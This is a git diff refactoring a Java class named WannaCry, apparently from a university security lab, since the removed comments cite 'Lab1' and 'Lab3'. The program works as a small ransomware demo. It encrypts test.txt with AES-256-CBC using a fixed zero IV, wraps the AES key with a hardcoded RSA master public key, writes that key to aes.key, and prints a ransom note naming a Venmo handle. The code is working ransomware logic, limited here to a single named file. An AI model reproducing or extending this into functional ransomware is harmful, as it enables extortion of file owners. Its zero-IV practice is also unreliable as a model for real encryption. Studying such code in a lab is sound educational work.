@@ -1,5 +1,9 @@
 package le.ac.uk.WannaCry;
 
+import javax.crypto.Cipher;
+import javax.crypto.KeyGenerator;
+import javax.crypto.SecretKey;
+import javax.crypto.spec.IvParameterSpec;
 import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
@@ -7,22 +11,16 @@ import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.security.KeyFactory;
-import java.security.spec.X509EncodedKeySpec;
-import java.security.KeyStore.SecretKeyEntry;
 import java.security.PublicKey;
-import java.util.Base64;
-import javax.crypto.SecretKey; // I added this for Secret Key? Not sure if that means SecretKeyEntry may be the wrong lib.
-import javax.crypto.spec.IvParameterSpec;
 import java.security.SecureRandom;
-import javax.crypto.Cipher;
-import javax.crypto.KeyGenerator;
+import java.security.spec.X509EncodedKeySpec;
+import java.util.Base64;
 
 public class WannaCry {
-    public static void main(String[] args) throws Exception{
-        // Gen 256-bit AES key - Lab3. 
+    public static void main(String[] args) throws Exception {
         KeyGenerator Key_Generator = KeyGenerator.getInstance("AES");
         Key_Generator.init(256, new SecureRandom());
-        SecretKey KEY_AES = Key_Generator.generateKey();
+        SecretKey keySecret = Key_Generator.generateKey();
 
         byte[] fileBytes = null;
         try (FileInputStream fis = new FileInputStream("test.txt")) {
@@ -35,11 +33,10 @@ public class WannaCry {
         if (fileBytes == null) return;
 
         byte[] encryptedFileBytes = null;
-        // Content's encrypted using AES key, CBC, PKCS5. Lab3.
-        IvParameterSpec Zero_Padding_IV = new IvParameterSpec(new byte[16]);
-        Cipher AES_Cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
-        AES_Cipher.init(Cipher.ENCRYPT_MODE, KEY_AES, Zero_Padding_IV);
-        encryptedFileBytes=AES_Cipher.doFinal(fileBytes);
+        IvParameterSpec zeroPaddingIV = new IvParameterSpec(new byte[16]);
+        Cipher AESCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
+        AESCipher.init(Cipher.ENCRYPT_MODE, keySecret, zeroPaddingIV);
+        encryptedFileBytes = AESCipher.doFinal(fileBytes);
 
         try (FileOutputStream fos = new FileOutputStream("test.txt.cry")) {
             if (encryptedFileBytes != null) fos.write(encryptedFileBytes);
@@ -55,33 +52,26 @@ public class WannaCry {
             return;
         }
 
-        //Public key from masterPublicKeyBase64 - Lab1, Lab3.
         String masterPublicKeyBase64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqW9Skh563WZyyNnXOz3kK8QZpuZZ3rIwnFpPqoymMIiHlLBfvDKlHzw1xWFTqISBLkgjOCrDnFDy/LZo8hTFWdXoxoSHvZo/tzNkVNObjulneQTy8TXdtcdPxHDa5EKjXUTjseljPB8rgstU/ciFPb/sFTRWR0BPb0Sj0PDPE/zHW+mjVfK/3gDT+RNAdZpQr6w16YiQqtuRrQOQLqwqtt1Ak/Oz49QXaK74mO+6QGtyfIC28ZpIXv5vxYZ6fcnb1qbmaouf6RxvVLAHoX1eWi/s2Ykur2A0jho41GGXt0HVxEQouCxho46PERCUQT1LE1dZetfJ4WT3L7Z6Q6BYuQIDAQAB";
         Base64.Decoder decoder = Base64.getDecoder(); // From Lab1.
-        byte[] Bytes_Key_Master = decoder.decode(masterPublicKeyBase64);
-        // Wrap in X509EncodedKeySpec
-        X509EncodedKeySpec Spec_Key = new X509EncodedKeySpec(Bytes_Key_Master); // From lab3. 
-        KeyFactory Key_Factory = KeyFactory.getInstance("RSA");
-        PublicKey Key_Master_Public = Key_Factory.generatePublic(Spec_Key);
+        byte[] masterPublicKeyBytes = decoder.decode(masterPublicKeyBase64);
+        X509EncodedKeySpec X509KeySpec = new X509EncodedKeySpec(masterPublicKeyBytes);
+        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
+        PublicKey keyMasterPublic = keyFactory.generatePublic(X509KeySpec);
 
+        Cipher RSACipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
+        RSACipher.init(Cipher.ENCRYPT_MODE, keyMasterPublic);
+        byte[] keySecretEncodedBytes = RSACipher.doFinal(keySecret.getEncoded());
 
-        // AES key encrypted in bytes with RSA using the public  and master key. Lab3. 
-        Cipher RSA_Cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding"); 
-        RSA_Cipher.init(Cipher.ENCRYPT_MODE, Key_Master_Public);
-        byte[] Aes_Key_Bytes = KEY_AES.getEncoded();
-        byte[] Key_AES_Encrypted = RSA_Cipher.doFinal(Aes_Key_Bytes);
-
-        // Write to AES.key the encrypted bytes. Lab1. 
         try (FileOutputStream fos = new FileOutputStream("aes.key")) {
-            fos.write(Key_AES_Encrypted);
+            fos.write(keySecretEncodedBytes);
         }
 
         String ransomMessage = """
                 Dear Victim - Please note that your files have now stolen and encrypted!
-
-                If you want them back, let a girl a know. My venmo is pricessCatBurger28. 
+                
+                If you want them back, let a girl a know. My venmo is princessCatBurger28.
                 """;
         System.out.println(ransomMessage);
-        return;
     }
 }
